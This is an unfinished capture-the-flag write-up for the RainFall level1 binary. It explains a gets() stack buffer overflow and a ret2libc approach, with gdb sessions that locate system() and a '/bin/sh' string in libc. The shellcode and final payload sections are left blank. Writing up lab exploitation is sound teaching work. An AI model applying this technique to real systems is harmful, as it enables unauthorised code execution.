#Level 1

## Buffer Overflow
In main we see that 76 bytes are allocated on the stack for a buffer, and then `gets` is called to fill that buffer.
Interestingly a quick `man 3 gets` informs us that `gets` should never be used as it is extremely dangerous...

This is commonly called a buffer overflow

{TODO explain stack}

## Shellcode
{TODO}

## Ret2libc
An alternative to using a shellcode is to find the adress of the `system()` function in memory and to complement it with a memory location that contains a shell path string.
This method has the advantage of also working when the NX bit is set (not the case here), NX being a technology that marks certain areas of memory as non-executable, supposedly foiling buffer overflow attacks. 

### Finding system()
First things first, let's get the address of the `system()` function in memory
```shell
level1@RainFall:~$ gdb ./level1 
[...]
(gdb) b main
Breakpoint 1 at 0x8048483
(gdb) r
Starting program: /home/user/level1/level1 

Breakpoint 1, 0x08048483 in main ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
```
We now know that `system()` is at `0xb7e6b060`

### Hot /bin/sh in your area

Now that we know the location of `system()` in memory, we could awkwardly get a shell string from the most obvious location, `$SHELL` in the stack, except this would expose us to the whim of a changing execution environment, messing our precious addresses.
A better approach is to get it from a mapped library, lucky for us the glibc contains `/bin/sh` as a string

First let's check where the libc is mapped within the program memory
```shell
(gdb) info proc map
process 3688
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/user/level1/level1
         0x8049000  0x804a000     0x1000        0x0 /home/user/level1/level1
        0xb7e2b000 0xb7e2c000     0x1000        0x0 
        0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
[...]
```

We can see that the libc is mapped several times, between `0xb7e2b000` and `0xb7fd2000`.

Let's now convert `/bin/sh/` to binary and search for it within this address space
```shell
(gdb) p/x "/bin/sh"
$8 = {0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x0}
(gdb) find /b 0xb7e2b000, 0xb7fd2000, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x0
0xb7f8cc58
1 pattern found.
(gdb) x/s 0xb7f8cc58
0xb7f8cc58:      "/bin/sh"
```
`system()` is at `0xb7e6b060` and `"/bin/sh"` at `0xb7f8cc58`, nice!

###  Putting it all together

